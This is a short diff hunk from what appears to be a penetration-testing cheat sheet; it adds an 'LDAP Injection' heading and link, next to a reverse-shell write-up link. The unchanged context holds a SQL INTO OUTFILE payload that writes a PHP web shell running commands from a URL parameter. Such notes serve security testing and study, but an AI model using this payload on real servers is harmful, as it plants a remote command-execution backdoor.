@@ -357,3 +357,6 @@ https://wiremask.eu/writeups/reverse-shell-on-a-nodejs-application/
 ```
 SELECT ("<?php echo system($_GET['cmd']); ?>") INTO OUTFILE "/var/www/html/payload.php"
 ```
+
+### LDAP Injection
+https://book.hacktricks.xyz/pentesting-web/ldap-injection#special-blind-ldap-injection-without
